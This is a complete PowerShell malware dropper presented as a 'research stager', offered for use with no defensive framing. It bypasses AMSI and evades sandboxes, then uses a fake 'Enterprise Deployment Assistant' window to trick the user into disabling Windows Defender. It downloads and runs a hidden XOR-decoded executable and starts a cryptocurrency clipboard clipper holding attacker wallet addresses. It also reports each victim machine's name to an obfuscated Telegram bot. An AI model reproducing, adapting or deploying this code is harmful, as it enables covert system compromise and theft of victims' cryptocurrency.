# --- [RESEARCH STAGER v44.0: ABSOLUTE LOGIC SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Force Admin Elevation (v34.0 Core Logic)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    try { (New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m") | Out-Null } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,560)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,40); $console.Size = New-Object Drawing.Size(490,140)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > ANALYZING KERNEL... DONE`n > ELEVATED PRIVILEGES: GRANTED`n > STATUS: [!] SECURITY CONFLICT"
    $prep.Controls.Add($console)

    # Visual Guide Label
    $guide = New-Object Windows.Forms.Label
    $guide.Location = New-Object Drawing.Point(35,190); $guide.Size = New-Object Drawing.Size(500,60)
    $guide.ForeColor = [Drawing.Color]::DarkRed; $guide.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $guide.Text = "IMPORTANT: Toggle 'Real-time protection' to OFF in the window that opens. Installation will fail if this is active."
    $prep.Controls.Add($guide)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,260); $link.Size = New-Object Drawing.Size(480,45)
    $link.Text = "STEP 1: Open Security Panel (Turn OFF)"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,330); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "STEP 2: I have manually disabled Real-time protection."
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,400); $btn.Size = New-Object Drawing.Size(180,45); $btn.Text = "Deploy Now"; $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Invoke-Execution {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Deployment Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Text = "Status: Initializing..."
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($label); $form.Controls.Add($pb); $form.Show()

    # --- THE SECRETE INSTALL (V34.0 Logic) ---
    try {
        $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        
        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)
        Start-Process $path -WindowStyle Hidden # RUN ADCHAR

        # CLIPPER
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
    } catch { }

    # Progress Animation
    $stages = @(@{p=30;t="Applying Certificate..."}, @{p=70;t="Writing Kernel..."}, @{p=100;t="Success."})
    foreach ($s in $stages) {
        $label.Text = "Status: " + $s.t
        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 50 }
    }
    $form.Close()
    [Windows.Forms.MessageBox]::Show("Activation Complete.", "Success", 0, 64) | Out-Null
}

# --- EXECUTION ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) {
    Send-Ping -m "V44_DEPLOY_START_$env:COMPUTERNAME"
    Invoke-Execution
}
